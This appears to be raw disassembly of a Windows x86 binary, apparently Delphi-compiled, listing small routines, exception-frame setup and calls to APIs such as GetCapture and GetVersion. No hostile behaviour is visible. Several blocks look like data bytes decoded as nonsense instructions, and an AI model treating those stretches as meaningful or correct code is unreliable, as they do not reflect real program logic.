pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425a71
jmp sub_44c770
sub_425f4d
jmp sub_44c770
sub_425f80
jmp sub_44c770
sub_4263b4
jmp sub_44c770
sub_4263bb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426541
jmp sub_44c770
sub_426548
pop ebp
retn
sub_42654c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4264e8
call sub_44c904
mov eax [ rw-data ]
mov [ eax ] sub_41a324
sub_4265fe
inc edx
add [ eax ] bh
mov eax 0xb8500042
inc edx
add [ ebx + esi * 8 - 0xc27ffbe ] dl
inc edx
add [ edx + edi * 4 - 0x3773ffbe ] dh
inc edx
add ah cl
mov [ edx ] sub_42cd20
cwde
0x42
sub_426d86
jmp sub_44c770
sub_426d8d
mov esp ebp
pop ebp
retn
sub_4271c9
jmp sub_44c770
sub_4271d0
pop ebp
retn
sub_4271d4
sub [ rw-data ] 0x1
retn
sub_4274a4
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_428102
inc edx
add [ eax ] bh
mov eax 0xb8500042
inc edx
add [ ebx + esi * 8 - 0xc27ffbe ] dl
inc edx
add [ edx + edi * 4 - 0x3773ffbe ] dh
inc edx
add ah cl
mov [ edx ] sub_42cd20
cwde
0x42
sub_42819a
jmp r-xdata
sub_42819c
0xe8ffe9ff 0xe7ff
sub_4281a3
jmp esi
sub_428443
add ah ch
add [ eax ] eax
add [ eax - 0x80 ] dh
inc edx
add [ esp + ebp ] bh
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
sub_428be8
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_428db8
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_429508
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn 0x8
sub_429554
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
call ReleaseCapture
mov eax [ ebp - 0x8 ]
call sub_41a5e4
pop ecx
pop ecx
pop ebp
retn
sub_429651
jmp sub_44c4bc
sub_429656
cmp [ rw-data ] 0x0
je r-xdata
call sub_44c7c4
call sub_44c818
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_42a980
sub_429678
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4296c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
pop ecx
pop ebp
retn
sub_4296cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4296e4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
pop ecx
pop ebp
retn
sub_429b2c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x7 ] dl
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6 ] 0x0
mov ax [ ebp - 0x6 ]
mov esp ebp
pop ebp
retn 0x4
sub_429b4c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x4
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42a8e2
jmp sub_44c4bc
sub_42abce
jmp sub_44c770
sub_42abfb
jmp sub_44c770
sub_42ac08
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_42a980
sub_42adef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40fab8
retn
sub_42ae05
jmp sub_44c770
sub_42ae2c
jmp sub_44c770
sub_42aeae
jmp sub_44c770
sub_42aed6
jmp sub_44c770
sub_42aedd
mov esp ebp
pop ebp
retn
sub_42afab
jmp sub_44c770
sub_42b393
jmp sub_44c770
sub_42b39a
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_42b429
jmp sub_44c770
sub_42b430
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
sub_42b838
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42b850
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x48 ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42b86c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42b884
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
setne [ ebp - 0x5 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42b8a0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42bab4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4d ] al
pop ecx
pop ecx
pop ebp
retn
sub_42c117
jmp sub_44c770
sub_42c11e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c39b
jmp sub_44c770
sub_42c3a2
mov esp ebp
pop ebp
retn
sub_42c76d
jmp sub_44c770
sub_42c774
mov esp ebp
pop ebp
retn
sub_42ca8b
jmp sub_44c770
sub_42ca92
mov esp ebp
pop ebp
retn
sub_42cd9c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
call sub_4291a0
cmp eax [ ebp - 0x4 ]
sete [ ebp - 0x5 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42cfd7
jmp sub_44c770
sub_42cfde
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_42d238
jmp sub_44c770
sub_42d258
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42d3f8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
pop ecx
pop ebp
retn
sub_42d404
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp eax [ ebp - 0x4 ]
sete [ ebp - 0x5 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42d845
jmp sub_44c770
sub_42d84c
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_42dbd4
jmp sub_44c770
sub_42dcbc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
sub_42e068
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
pop ecx
pop ebp
retn
sub_42eb18
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
pop ecx
pop ecx
pop ebp
retn
sub_42eb30
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
pop ecx
pop ecx
pop ebp
retn
sub_42eb48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
pop ecx
pop ecx
pop ebp
retn
sub_42ecd0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop ecx
pop ecx
pop ebp
retn
sub_42ed4c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
pop ecx
pop ecx
pop ebp
retn
sub_42f04f
jmp sub_44c770
sub_42f056
pop ebx
mov esp ebp
pop ebp
retn
sub_42f08c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42f263
jmp sub_44c770
sub_42f26a
mov esp ebp
pop ebp
retn
sub_42f3d8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42f7f3
jmp sub_44c770
sub_42f7fa
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42fa24
jmp sub_44c770
sub_42fa73
jmp sub_44c770
sub_42faa8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_42fd2b
jmp sub_44c770
sub_42fe4d
jmp sub_44c770
sub_4301c2
jmp sub_44c770
sub_430271
jmp sub_44c770
sub_430280
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x120 ]
pop ecx
pop ebp
retn
sub_4302c8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4301e8
pop ecx
pop ebp
retn
sub_4303c2
jmp sub_44c770
sub_4303c9
mov esp ebp
pop ebp
retn
sub_4304d6
jmp sub_44c770
sub_430b16
jmp sub_44c770
sub_430b1d
mov esp ebp
pop ebp
retn
sub_430ce6
jmp sub_44c770
sub_430ced
pop ebx
mov esp ebp
pop ebp
retn
sub_430e1d
jmp sub_44c770
sub_430e24
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x14c ] edx
pop ecx
pop ebp
retn
sub_431133
jmp sub_44c4bc
sub_431203
jmp sub_44c770
sub_431214
jmp sub_44c4bc
sub_431219
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4251dc
call sub_44c818
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4319c1
jmp sub_44c770
sub_4319c8
mov esp ebp
pop ebp
retn
sub_432576
jmp sub_44c770
sub_43257d
mov esp ebp
pop ebp
retn
sub_43261e
jmp sub_44c770
sub_432625
pop ecx
pop ecx
pop ebp
retn
sub_43264c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_432ada
jmp sub_44c770
sub_432ae1
pop ebx
mov esp ebp
pop ebp
retn
sub_432bb3
jmp sub_44c770
sub_432c95
jmp sub_44c770
sub_4337e4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430890
pop ecx
pop ecx
pop ebp
retn
sub_433800
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430890
pop ecx
pop ecx
pop ebp
retn
sub_43381c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430890
pop ecx
pop ecx
pop ebp
retn
sub_433ae8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430890
pop ecx
pop ecx
pop ebp
retn
sub_433b04
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430890
pop ecx
pop ecx
pop ebp
retn
sub_433b20
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430890
pop ecx
pop ecx
pop ebp
retn
sub_433b3c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430890
pop ecx
pop ecx
pop ebp
retn
sub_434133
jmp sub_44c770
sub_43413a
mov esp ebp
pop ebp
retn
sub_4344e8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
push 0x0
xor ecx ecx
mov edx 0xb034
mov eax [ ebp - 0x4 ]
call sub_42df28
pop ecx
pop ebp
retn
sub_434bcc
jmp sub_44c770
sub_434bd3
pop ebx
mov esp ebp
pop ebp
retn
sub_434bd8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14c ] 0x0
setne [ ebp - 0x5 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_434e63
jmp sub_44c770
sub_434e6a
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43546e
jmp sub_44c770
sub_43551c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_435700
jmp sub_44c770
sub_435b19
jmp sub_44c770
sub_435cf4
jmp sub_44c770
sub_435cfb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x120 ]
call sub_40fab8
retn
sub_435d17
jmp sub_44c770
sub_435d24
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
pop ecx
pop ebp
retn
sub_435e00
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
pop ecx
pop ecx
pop ebp
retn
sub_435e92
jmp sub_44c770
sub_435e99
mov esp ebp
pop ebp
retn
sub_435f37
jmp sub_44c770
sub_435f3e
mov esp ebp
pop ebp
retn
sub_435fd8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_430f60
pop ecx
pop ebp
retn
sub_436092
jmp sub_44c770
sub_436099
mov esp ebp
pop ebp
retn
sub_4361d2
jmp sub_44c770
sub_4361d9
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_43639d
jmp sub_44c770
sub_4367c2
jmp sub_44c770
sub_4367c9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4367ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_40fab8
retn
sub_4367e5
jmp sub_44c770
sub_4367ec
pop ecx
pop ecx
pop ebp
retn
sub_4367f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
pop ecx
pop ebp
retn
sub_436ca9
jmp sub_44c770
sub_436f8b
jmp sub_44c770
sub_43707c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x6c ]
pop ecx
pop ebp
retn
sub_437ee3
jmp sub_44c770
sub_437eea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437f07
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_437f00
jmp sub_44c770
sub_437f07
pop ebx
mov esp ebp
pop ebp
retn
sub_438255
jmp sub_44c770
sub_43825c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438279
mov eax [ ebp - 0xc ]
call sub_40fab8
retn
sub_438272
jmp sub_44c770
sub_438279
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438296
mov eax [ ebp - 0xc ]
call sub_44c070
retn
sub_43828f
jmp sub_44c770
sub_438296
pop ebx
mov esp ebp
pop ebp
retn
sub_4388f1
jmp sub_44c770
sub_4388f8
mov esp ebp
pop ebp
retn
sub_438abf
jmp sub_44c770
sub_438ac6
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438b92
jmp sub_44c770
sub_438b99
pop ebx
mov esp ebp
pop ebp
retn
sub_438ca8
jmp sub_44c770
sub_438cf9
jmp sub_44c770
sub_438d00
pop ebx
mov esp ebp
pop ebp
retn
sub_439865
jmp sub_44c770
sub_43986c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439954
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
call GetCapture
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_439c3b
jmp sub_44c770
sub_43a05f
jmp sub_44c770
sub_43a066
pop ebp
retn
sub_43a068
sub [ rw-data ] 0x1
jae r-xdata
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_439f10
sub_43a349
jmp sub_44c770
sub_43a350
pop ebp
retn
sub_43a354
sub [ rw-data ] 0x1
retn
sub_43a38d
jmp sub_44c770
sub_43a394
pop ebp
retn
sub_43abec
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_43ac44
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_43ac98
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_43ad0c
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_43adc8
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_43aec4
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_43afc8
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_43afd0
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax ] cl
jmp r-xdata
inc esp
add [ eax - 0x5bffbb3e ] ah
retn 0x44
sub_43b100
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_43b360
adc ah ah
inc esp
add [ esp ] bl
inc esp
add [ eax - 0x63ffbb3e ] ch
retn 0x44
sub_43b44c
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_43b454
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x14 ] 0xfa
inc ebx
add [ eax ] ch
hlt
sub_43b530
pushfd
retn 0x44
sub_43b70c
pushfd
retn 0x44
sub_43b767
jmp [ eax + 0x2f ]
sub_43b840
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_43b8af
jmp sub_44c770
sub_43b8b6
mov esp ebp
pop ebp
retn
sub_43b96c
jmp sub_44c770
sub_43ba77
jmp sub_44c770
sub_43ba7e
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_43bb67
jmp sub_44c770
sub_43bb6e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bb8b
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
sub_43bb84
jmp sub_44c770
sub_43bb8b
mov esp ebp
pop ebp
retn
sub_43bcb0
jmp sub_44c770
sub_43bcb7
mov esp ebp
pop ebp
retn
sub_43bcec
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_43be2c
jmp sub_44c770
sub_43bf88
jmp sub_44c770
sub_43c165
jmp sub_44c770
sub_43c16c
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
sub_43c203
jmp sub_44c770
sub_43c20a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c229
mov eax [ rw-data ]
call sub_448f68
retn
sub_43c222
jmp sub_44c770
sub_43c229
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_43c370
push ebp
mov ebp esp
mov eax [ ebp + 0x4 ]
pop ebp
retn
sub_43c3b3
mov esp ebp
pop ebp
retn
sub_43c40c
jmp sub_44c770
sub_43c413
pop ebx
mov esp ebp
pop ebp
retn
sub_43c860
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_43c93e
jmp sub_44c770
sub_43c945
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43c9d9
jmp sub_44c770
sub_43c9e0
pop ecx
pop ecx
pop ebp
retn
sub_43ca52
jmp sub_44c770
sub_43ca59
pop ecx
pop ecx
pop ebp
retn
sub_43ca60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call LeaveCriticalSection
pop ecx
pop ebp
retn
sub_43cacc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
pop ecx
pop ebp
retn
sub_43cc17
retn
sub_43cdf6
jmp sub_44c770
sub_43cdfd
mov esp ebp
pop ebp
retn
sub_43ce10
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43cd38
pop ecx
pop ecx
pop ebp
retn
sub_43ce2c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_43cedb
jmp sub_44c770
sub_43cee2
pop ebx
mov esp ebp
pop ebp
retn
sub_43d0e7
jmp sub_44c770
sub_43d0ee
pop ebx
mov esp ebp
pop ebp
retn
sub_43d103
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43d164
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43cf90
pop ecx
pop ecx
pop ebp
retn
sub_43d269
jmp sub_44c770
sub_43d387
jmp sub_44c770
sub_43d38e
pop ebx
mov esp ebp
pop ebp
retn
sub_43d584
jmp sub_44c770
sub_43d58b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d5a8
lea eax [ ebp - 0x14 ]
call sub_44cae0
retn
sub_43d5a1
jmp sub_44c770
sub_43d5a8
pop ebx
mov esp ebp
pop ebp
retn
sub_43d60d
jmp sub_44c770
sub_43d7bc
jmp sub_44c770
sub_43d7c3
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_43d7cc
push ebp
mov ebp esp
mov eax [ ebp + 0x4 ]
pop ebp
retn
sub_43d80f
mov esp ebp
pop ebp
retn
sub_43d866
jmp sub_44c770
sub_43d86d
pop ebx
mov esp ebp
pop ebp
retn
sub_43d932
jmp sub_44c770
sub_43d939
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d95b
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_44cb04
retn
sub_43d954
jmp sub_44c770
sub_43d95b
pop ebx
mov esp ebp
pop ebp
retn
sub_43d97c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_43d9e1
jmp sub_44c770
sub_43d9e8
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_43daed
jmp sub_44c770
sub_43daf4
pop ebx
mov esp ebp
pop ebp
retn
sub_43db76
jmp sub_44c770
sub_43db7d
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_43dc57
jmp sub_44c770
sub_43dc5e
mov esp ebp
pop ebp
retn
sub_43dced
jmp sub_44c770
sub_43dcf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dd11
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
sub_43dd0a
jmp sub_44c770
sub_43dd11
pop ebx
mov esp ebp
pop ebp
retn
sub_43dda8
jmp sub_44c770
sub_43ddc5
jmp sub_44c770
sub_43ddcc
pop ebx
mov esp ebp
pop ebp
retn
sub_43de14
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_43dea7
jmp sub_44c770
sub_43deae
mov eax [ ebp - 0x8 ]
call sub_440b44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ded3
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_43decc
jmp sub_44c770
sub_43ded3
mov esp ebp
pop ebp
retn
sub_43df2a
jmp sub_44c770
sub_43df31
mov esp ebp
pop ebp
retn
sub_43df8d
jmp sub_44c770
sub_43df94
mov esp ebp
pop ebp
retn
sub_43df98
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_43e03f
jmp sub_44c770
sub_43e046
mov esp ebp
pop ebp
retn
sub_43e103
jmp sub_44c770
sub_43e10a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e127
lea eax [ ebp - 0x14 ]
call sub_44cae0
retn
sub_43e120
jmp sub_44c770
sub_43e127
mov esp ebp
pop ebp
retn
sub_43e12c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_43e1bb
jmp sub_44c770
sub_43e1c2
pop ebx
mov esp ebp
pop ebp
retn
sub_43e5b0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43e5cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43ea1c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov edx sub_43e9e4
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
pop ecx
pop ebp
retn
sub_43eb08
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_43ec66
jmp sub_44c770
sub_43ec6d
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_43ecc9
jmp sub_44c770
sub_43ecd0
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_43f27b
jmp sub_44c770
sub_43f282
mov esp ebp
pop ebp
retn
sub_43f428
push ebp
mov ebp esp
